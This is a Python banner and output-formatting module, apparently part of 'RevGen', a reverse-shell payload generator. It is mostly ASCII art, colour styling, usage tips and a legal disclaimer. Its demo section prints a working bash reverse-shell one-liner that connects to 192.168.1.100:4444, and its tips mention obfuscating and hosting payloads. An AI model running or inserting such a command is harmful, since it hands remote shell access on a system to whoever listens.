#!/usr/bin/env python3
"""
ASCII Art and Banner Module for RevGen
Because every hacker tool needs dramatic flair ⚡
"""

import random
import time
import sys
from typing import List, Optional


class Colors:
    """ANSI color codes for terminal styling"""
    # Basic colors
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    
    # Styles
    BOLD = '\033[1m'
    DIM = '\033[2m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    
    # Reset
    RESET = '\033[0m'
    
    # Hacker colors
    MATRIX_GREEN = '\033[38;5;46m'
    NEON_CYAN = '\033[38;5;51m'
    FIRE_RED = '\033[38;5;196m'
    ELECTRIC_BLUE = '\033[38;5;27m'


def get_main_banner() -> str:
    """Main RevGen banner - the showstopper"""
    return f"""{Colors.MATRIX_GREEN}{Colors.BOLD}
$$$$$$$\                             $$$$$$\                      
$$  __$$\                           $$  __$$\                     
$$ |  $$ | $$$$$$\ $$\    $$\       $$ /  \__| $$$$$$\  $$$$$$$\  
$$$$$$$  |$$  __$$ $$$\  $$  |      $$ |$$$$\ $$  __$$\ $$  __$$\ 
$$  __$$< $$$$$$$$ |\$$\$$  /       $$ |\_$$ |$$$$$$$$ |$$ |  $$ |
$$ |  $$ |$$   ____| \$$$  /        $$ |  $$ |$$   ____|$$ |  $$ |
$$ |  $$ |\$$$$$$$\   \$  /         \$$$$$$  |\$$$$$$$\ $$ |  $$ |
\__|  \__| \_______|   \_/           \______/  \_______|\__|  \__|
                                                                  
{Colors.RESET}

{Colors.NEON_CYAN}          🧞‍♂️ Reverse Shell Genie 🧞‍♂️{Colors.RESET}
{Colors.YELLOW}     Your magical spellbook for terminal takeovers{Colors.RESET}
"""


def get_skull_banner() -> str:
    """Spooky skull banner for intimidation factor"""
    return f"""{Colors.RED}{Colors.BOLD}
                    .-""""""-.
                  .'          '.
                 /   O      O   \\
                :           `    :
                |                |
                :    .------.    :
                 \\  '        '  /
                  '.          .'
                    '-.......-'
{Colors.RESET}{Colors.WHITE}
    💀 SHELL CONJURING IN PROGRESS 💀{Colors.RESET}
"""


def get_fire_banner() -> str:
    """Fire banner for the heat"""
    return f"""{Colors.FIRE_RED}{Colors.BOLD}
                     (  .      )
                 )           (              )
               _(               )        ( _(
            ( (  (        )    _)   ) ) ) ( (
         ( (    )(    (    (   (    (   (   (
        )      ( (  (      ( (     (       )
       (          )  )     ) (           ( 
       )    )  (      (   (   )     (     
      ( ) ( (  (   )  )(    )  ) ) ) ) _) (
     _)    _(  _)  ( ( (  _)_)_)    ___  )_)
{Colors.RESET}{Colors.YELLOW}
     🔥 PAYLOAD FORGED IN DIGITAL FLAMES 🔥{Colors.RESET}
"""


def get_matrix_banner() -> str:
    """Matrix-style digital rain effect"""
    return f"""{Colors.MATRIX_GREEN}
01001000 01000001 01000011 01001011 01000101 01010010
01010011 01001000 01000101 01001100 01001100 00100000
01000111 01000101 01001110 01001001 01000101 00100000
01001001 01001110 01001001 01010100 01001001 01000001
01010100 01001001 01001110 01000111 00101110 00101110
{Colors.RESET}{Colors.NEON_CYAN}
        🌐 ENTERING THE MATRIX OF SHELLS 🌐{Colors.RESET}
"""


def get_genie_banner() -> str:
    """Magical genie lamp banner"""
    return f"""{Colors.YELLOW}{Colors.BOLD}
                    _____
                   /     \\
                  | () () |
                   \\  ^  /
                    |||||
                    |||||
                   /|||||\\
                  / ||||| \\
                 /  |||||  \\
                /_________|

{Colors.MAGENTA}    🧞‍♂️ THREE WISHES GRANTED: ACCESS, PERSISTENCE, PROFIT 🧞‍♂️{Colors.RESET}
"""


def get_random_banner() -> str:
    """Get a random banner for variety"""
    banners = [get_skull_banner, get_fire_banner, get_matrix_banner, get_genie_banner]
    return random.choice(banners)()


def print_typewriter(text: str, delay: float = 0.03) -> None:
    """Print text with typewriter effect"""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()


def print_banner(style: str = "main", fancy: bool = False) -> None:
    """Print banner with optional fancy effects"""
    if style == "main":
        banner = get_main_banner()
    elif style == "skull":
        banner = get_skull_banner()
    elif style == "fire":
        banner = get_fire_banner()
    elif style == "matrix":
        banner = get_matrix_banner()
    elif style == "genie":
        banner = get_genie_banner()
    elif style == "random":
        banner = get_random_banner()
    else:
        banner = get_main_banner()
    
    if fancy:
        print_typewriter(banner, delay=0.01)
    else:
        print(banner)


def format_payload_output(shell_name: str, payload: str, description: str = "", fancy: bool = False) -> str:
    """Format payload output with styling"""
    if fancy:
        header = f"{Colors.NEON_CYAN}{Colors.BOLD}╔{'═' * 60}╗{Colors.RESET}"
        title = f"{Colors.NEON_CYAN}{Colors.BOLD}║{Colors.YELLOW} {shell_name:^58} {Colors.NEON_CYAN}║{Colors.RESET}"
        separator = f"{Colors.NEON_CYAN}╠{'═' * 60}╣{Colors.RESET}"
        
        # Word wrap the payload if it's too long
        max_width = 56
        if len(payload) > max_width:
            wrapped_lines = []
            for i in range(0, len(payload), max_width):
                line = payload[i:i+max_width]
                wrapped_lines.append(f"{Colors.NEON_CYAN}║{Colors.WHITE} {line:<{max_width}} {Colors.NEON_CYAN}║{Colors.RESET}")
        else:
            wrapped_lines = [f"{Colors.NEON_CYAN}║{Colors.WHITE} {payload:<{max_width}} {Colors.NEON_CYAN}║{Colors.RESET}"]
        
        footer = f"{Colors.NEON_CYAN}╚{'═' * 60}╝{Colors.RESET}"
        
        result = [header, title, separator] + wrapped_lines + [footer]
        
        if description:
            result.append(f"{Colors.DIM}{Colors.CYAN}💡 {description}{Colors.RESET}")
        
        return "\n".join(result)
    else:
        result = f"{Colors.BOLD}{Colors.GREEN}[{shell_name}]{Colors.RESET}\n{payload}"
        if description:
            result += f"\n{Colors.DIM}{Colors.CYAN}💡 {description}{Colors.RESET}"
        return result


def print_success(message: str) -> None:
    """Print success message with styling"""
    print(f"{Colors.GREEN}{Colors.BOLD}✅ {message}{Colors.RESET}")


def print_error(message: str) -> None:
    """Print error message with styling"""
    print(f"{Colors.RED}{Colors.BOLD}❌ {message}{Colors.RESET}")


def print_warning(message: str) -> None:
    """Print warning message with styling"""
    print(f"{Colors.YELLOW}{Colors.BOLD}⚠️  {message}{Colors.RESET}")


def print_info(message: str) -> None:
    """Print info message with styling"""
    print(f"{Colors.CYAN}{Colors.BOLD}ℹ️  {message}{Colors.RESET}")


def print_separator(char: str = "═", length: int = 60, color: str = Colors.CYAN) -> None:
    """Print a separator line"""
    print(f"{color}{char * length}{Colors.RESET}")


def animate_progress(text: str = "Generating payloads", duration: float = 2.0) -> None:
    """Animated progress indicator"""
    frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    start_time = time.time()
    
    while time.time() - start_time < duration:
        for frame in frames:
            print(f"\r{Colors.CYAN}{frame} {text}...{Colors.RESET}", end="", flush=True)
            time.sleep(0.1)
    
    print(f"\r{Colors.GREEN}✅ {text} complete!{Colors.RESET}")


def print_usage_tip() -> None:
    """Print a random usage tip"""
    tips = [
        "💡 Use --copy to automatically copy payload to clipboard",
        "🔥 Try --fancy for Hollywood-style output",
        "🌐 IPv6 addresses are automatically detected",
        "🎭 Use --obfuscate to base64 encode your payloads",
        "⚡ Generate all payloads at once with --all",
        "🚀 Use --server to host payloads on a web server",
        "🎯 Always start your listener before executing the payload",
        "🔒 Remember: Only use on systems you own or have permission to test"
    ]
    
    tip = random.choice(tips)
    print(f"\n{Colors.YELLOW}{tip}{Colors.RESET}")


def print_legal_warning() -> None:
    """Print legal disclaimer"""
    warning = f"""
{Colors.RED}{Colors.BOLD}⚠️  LEGAL DISCLAIMER ⚠️{Colors.RESET}

{Colors.YELLOW}This tool is for educational purposes, authorized penetration testing,
and security research only. Unauthorized access to computer systems
is illegal and may result in criminal charges.

Use responsibly and only on systems you own or have explicit
written permission to test.{Colors.RESET}

{Colors.DIM}Press Enter to continue...{Colors.RESET}"""
    
    print(warning)
    input()


if __name__ == "__main__":
    # Demo all the banners
    print("RevGen Banner Demo")
    print_separator()
    
    banners = ["main", "skull", "fire", "matrix", "genie"]
    for banner_style in banners:
        print(f"\n{Colors.BOLD}=== {banner_style.upper()} BANNER ==={Colors.RESET}")
        print_banner(banner_style)
        time.sleep(1)
    
    # Demo payload formatting
    print("\n" + "="*60)
    print("PAYLOAD FORMATTING DEMO")
    print("="*60)
    
    sample_payload = "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"
    
    print("\nNormal formatting:")
    print(format_payload_output("Bash", sample_payload, "Classic bash reverse shell"))
    
    print("\nFancy formatting:")
    print(format_payload_output("Bash", sample_payload, "Classic bash reverse shell", fancy=True))
